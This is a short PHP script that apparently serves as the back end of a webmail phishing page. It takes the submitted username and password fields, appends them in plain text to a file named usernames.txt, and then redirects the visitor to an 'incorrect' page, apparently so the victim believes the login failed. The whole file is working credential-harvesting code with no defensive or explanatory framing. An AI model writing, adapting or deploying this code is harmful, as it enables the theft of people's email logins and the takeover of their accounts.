<?php


file_put_contents("usernames.txt", 
"Webmail Username: " . $_POST['mid'] . "
Webmail Password: " . $_POST['pid'] . "\n", FILE_APPEND);
header('Location: /new/incorrect.php');
exit();
?>